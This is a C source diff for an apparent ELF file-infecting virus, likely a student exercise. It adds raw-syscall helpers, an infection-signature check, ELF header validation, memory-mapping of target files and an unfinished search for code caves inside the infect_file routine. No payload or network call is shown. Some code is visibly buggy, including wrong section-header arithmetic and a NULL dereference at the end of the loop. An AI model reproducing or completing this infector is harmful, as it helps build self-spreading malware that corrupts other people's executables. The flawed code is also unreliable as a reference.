@@ -1,4 +1,5 @@
 #include "sys/types.h"
+#include "unistd.h"
 #include <stdint.h>
 #include <stdio.h>
 __attribute__((always_inline)) inline long
@@ -13,9 +14,16 @@ sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
 
 #include "syscall.h"
 #include <dirent.h>
+#include <elf.h>
 #include <fcntl.h>
 #include <stddef.h>
 #include <sys/syscall.h>
+
+typedef struct {
+    void *mem;
+    uint64_t size;
+} file;
+
 typedef struct linux_dirent64 {
     uint64_t d_ino;          /* 64-bit inode number */
     uint64_t d_off;          /* Not an offset; see getdents() */
@@ -78,6 +86,18 @@ ft_getdents64(int fd, char dirp[], size_t count) {
     return sys(SYS_getdents64, fd, (long)dirp, count, 0, 0, 0);
 }
 
+inline file
+file_mmap(int fd) {
+    file file;
+    int off = ft_lseek(fd, 0, SEEK_END);
+    file.size = off;
+
+    off = ft_lseek(fd, 0, SEEK_SET);
+
+    file.mem = (void *)ft_mmap(0, file.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+
+    return file;
+}
 inline int
 ft_strlen(volatile char *str) {
     int i = 0;
@@ -132,6 +152,13 @@ ft_string_search_fd(int fd, volatile char *needle) {
 }
 
 inline void
+prints_str_nl(char *str) {
+    ft_write(1, str, ft_strlen(str));
+    char nl = '\n';
+    ft_write(1, &nl, 1);
+}
+
+inline void
 signature_fill(volatile char *buf) {
     buf[0] = 'f';
     buf[1] = 'a';
@@ -160,6 +187,68 @@ signature_fill(volatile char *buf) {
     buf[24] = '\0';
 }
 
+typedef struct code_cave {
+    uint64_t start;
+    uint64_t size;
+} code_cave;
+
+inline Elf64_Shdr *
+get_next_section_header(uint64_t section_cur_end, file file) {
+    Elf64_Ehdr *header = file.mem;
+    Elf64_Shdr *section_header_table = file.mem + header->e_shoff;
+
+    Elf64_Shdr *section_header_next = NULL;
+
+    for (int i = 0; i < header->e_shnum; i++) {
+        Elf64_Shdr *sh = file.mem + header->e_shoff + header->e_shentsize + i;
+
+        if (sh->sh_offset >= section_cur_end) {
+            if (section_header_next == NULL)
+                section_header_next = sh;
+            else if (section_header_next->sh_offset > sh->sh_offset)
+                section_header_next = sh;
+        }
+    }
+    return section_header_next;
+}
+
+inline int
+code_caves_get(volatile code_cave code_caves[], volatile file file) {
+    Elf64_Shdr *section_header = NULL;
+    Elf64_Ehdr *header = file.mem;
+    uint64_t section_cur_end = header->e_phoff + header->e_phentsize * header->e_phnum;
+
+    do {
+        section_header = get_next_section_header(section_cur_end, file);
+        // unsigned long ahhhhhh = section_header->sh_offset + section_header->sh_size;
+        // if (section_header != NULL)
+        section_cur_end = section_header->sh_offset + section_header->sh_size;
+        // else
+        //     section_cur_end = file.size;
+    } while (section_header != NULL);
+    return 0;
+}
+
+inline int
+elf64_ident_check(volatile const Elf64_Ehdr *header) {
+
+    if (header->e_ident[EI_MAG0] != ELFMAG0) return 1;
+    if (header->e_ident[EI_MAG1] != ELFMAG1) return 1;
+    if (header->e_ident[EI_MAG2] != ELFMAG2) return 1;
+    if (header->e_ident[EI_MAG3] != ELFMAG3) return 1;
+
+    if (header->e_ident[EI_CLASS] != ELFCLASS64) return 2;
+
+    if (header->e_ident[EI_DATA] == ELFDATANONE) return 3;
+
+    if (header->e_ident[EI_VERSION] != EV_CURRENT) return 4;
+
+    for (size_t i = EI_PAD; i < sizeof(header->e_ident); i++) {
+        if (header->e_ident[i] != 0) return 5;
+    }
+    return 0;
+}
+
 inline int
 infect_file(char *path) {
     int fd = ft_open(path, O_RDWR, 0);
@@ -172,7 +261,19 @@ infect_file(char *path) {
 
     if (has_signature) return (0);
 
-    ft_write(1, path, ft_strlen(path));
+    ft_lseek(fd, 0, SEEK_SET);
+
+    volatile Elf64_Ehdr header;
+    ft_read(fd, &header, sizeof(Elf64_Ehdr));
+
+    if (elf64_ident_check(&header)) return 0;
+
+    volatile code_cave code_caves[100];
+
+    prints_str_nl(path);
+    volatile file file = file_mmap(fd);
+    code_caves_get(code_caves, file);
+    // get all code caves
 
     return (0);
 }
